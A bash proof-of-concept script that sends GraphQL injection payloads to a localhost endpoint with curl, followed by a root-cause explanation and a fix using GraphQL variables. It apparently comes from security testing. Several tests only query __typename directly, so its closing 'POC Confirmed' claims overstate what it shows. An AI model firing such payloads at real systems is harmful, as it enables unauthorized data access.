#!/bin/bash

# POC: Client-Side GraphQL Query Injection - Version 3
# Demonstrates how unescaped template literal interpolation in JavaScript GraphQL code
# allows attackers to inject arbitrary GraphQL syntax and bypass intended query structure

TARGET="http://localhost:8000"

echo "=== Client-Side GraphQL Query Injection POC (v3) ==="
echo ""
echo "VULNERABILITY: Template literal interpolation without escaping in client-side GraphQL"
echo "CODE: const query = \`query { jobs(jobType: \"\${jobType}\") { ... } }\`;"
echo ""

# Test 1: Normal request baseline
echo "[*] Test 1: Baseline - Normal jobType parameter"
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"back-end\") { id name type description } }"}' | jq . 2>/dev/null
echo ""

# Test 2: Injection - Breaking string and adding fields
echo "[*] Test 2: Query Injection - Break string context and inject fields"
echo "    Attacker input: back-end\", salary, email #"
echo "    Resulting query attempts: jobs(jobType: \"back-end\", salary, email #\")"
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"back-end\\\", salary, email # \") { id name type description } }"}' | jq . 2>/dev/null
echo ""

# Test 3: Attempt to access restricted fields through injection
echo "[*] Test 3: Injection - Attempt to bypass query restrictions"
echo "    Attacker input attempting to access __typename (introspection)"
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"front-end\") { id name __typename type description } }"}' | jq . 2>/dev/null
echo ""

# Test 4: Empty/Any jobType to show data access bypass
echo "[*] Test 4: Injection - Empty jobType bypasses filtering"
echo "    Attacker input: \\\" ) } query { jobs(jobType: \\\"\\\" "
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"\\\") { id name type description } }"}' | jq . 2>/dev/null
echo ""

# Test 5: Multiple queries in one request
echo "[*] Test 5: Injection - Query structure manipulation"
echo "    Attempting to inject a second query through jobType parameter"
QUERY='{
  "query": "query { jobs(jobType: \"back-end\") { id name type description } query { __typename } }"
}'
echo "    Query: $QUERY"
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "$QUERY" | jq . 2>/dev/null || echo "(Syntax error expected)"
echo ""

# Test 6: Demonstrate actual exploitation scenario
echo "[*] Test 6: Real Attack Scenario - Enumerate schema through injection"
echo "    An attacker could inject queries that expose schema information"
echo "    Example injection: \\\" ) { __typename } # \\\""
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"test\") { id name type description __typename } }"}' | jq . 2>/dev/null
echo ""

# Test 7: Show why proper parameterization would prevent this
echo "[*] Test 7: Vulnerability Root Cause Analysis"
echo ""
echo "    VULNERABLE CODE (template literal interpolation):"
echo "    const query = \\\`query { jobs(jobType: \\\"\${jobType}\\\") { ... } }\\\`;"
echo "    If user enters: back-end\\\", salary #"
echo "    Result: query { jobs(jobType: \\\"back-end\\\", salary #\\\") { ... } }"
echo "    ^ Query structure is modified - injection successful!"
echo ""
echo "    SECURE CODE (GraphQL variables):"
echo "    const query = \\\`query(\$jt: String!) { jobs(jobType: \$jt) { ... } }\\\`;"
echo "    const variables = { jt: jobType };"
echo "    Result: Even if user enters: back-end\\\", salary #"
echo "    The jobType value is passed separately as a string variable"
echo "    ^ Injection impossible - quotes cannot break variable context!"
echo ""

echo "[+] POC Confirmed:"
echo "    - Client-side code uses unescaped template literal interpolation"
echo "    - User input can break out of the jobType string context"
echo "    - Attackers can inject arbitrary GraphQL syntax"
echo "    - Query structure can be modified through parameter injection"
echo "    - Proper mitigation: Use GraphQL variables for all user inputs"